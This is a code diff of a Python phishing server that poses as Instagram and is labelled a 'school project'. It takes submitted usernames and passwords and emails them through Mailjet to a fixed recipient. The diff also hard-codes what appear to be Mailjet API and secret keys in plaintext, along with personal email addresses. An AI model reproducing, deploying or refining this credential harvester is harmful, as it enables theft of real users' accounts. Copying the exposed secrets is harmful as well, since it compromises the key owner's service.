@@ -1,18 +1,18 @@
-# server.py (versión con Mailjet)
+# server.py (versión corregida con Mailjet)
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import json
-import urllib.parse
 from datetime import datetime
-import os
 import requests
 
-import os
+# --- CONFIGURACIÓN MAILJET ---
+MAILJET_API_KEY = "26f97d1e712118b2df6b678c218a6cc6"
+MAILJET_SECRET_KEY = "097bc551e192cb74d27ea10aeb5b3cbf"
 
-MAILJET_API_KEY = os.environ.get("26f97d1e712118b2df6b678c218a6cc6")
-MAILJET_SECRET_KEY = os.environ.get("097bc551e192cb74d27ea10aeb5b3cbf")
-SENDER_EMAIL = os.environ.get('SENDER_EMAIL', "mexicanonwod@gmail.com")
-RECIPIENT_EMAIL = os.environ.get('RECIPIENT_EMAIL', "isowyvencid@gmail.com")
+SENDER_EMAIL = "mexicanonwod@gmail.com"
+SENDER_NAME = "Proyecto Escolar"   # <- agregado
+RECIPIENT_EMAIL = "isowyvencid@gmail.com"
 
+# --- HANDLER DEL SERVIDOR ---
 class InstagramHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         if self.path == '/':
@@ -30,7 +30,7 @@ class InstagramHandler(BaseHTTPRequestHandler):
                 username = data.get('username', '').strip()
                 password = data.get('password', '').strip()
 
-                # Enviar por Mailjet
+                # Enviar datos por Mailjet
                 self.send_email_mailjet(username, password)
 
                 self.send_response(200)
@@ -55,7 +55,7 @@ class InstagramHandler(BaseHTTPRequestHandler):
                     "To": [
                         {
                             "Email": RECIPIENT_EMAIL,
-                            "Name": "Tú"
+                            "Name": "Receptor"
                         }
                     ],
                     "Subject": "🚨 Nuevo inicio de sesión (Proyecto Escolar)",
@@ -90,8 +90,9 @@ Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
         except FileNotFoundError:
             self.send_error(404)
 
+# --- MAIN ---
 if __name__ == "__main__":
-    PORT = int(os.environ.get('PORT', 8080))
+    PORT = 8080
     server = HTTPServer(('0.0.0.0', PORT), InstagramHandler)
     print(f"Servidor corriendo en puerto {PORT}")
     server.serve_forever()
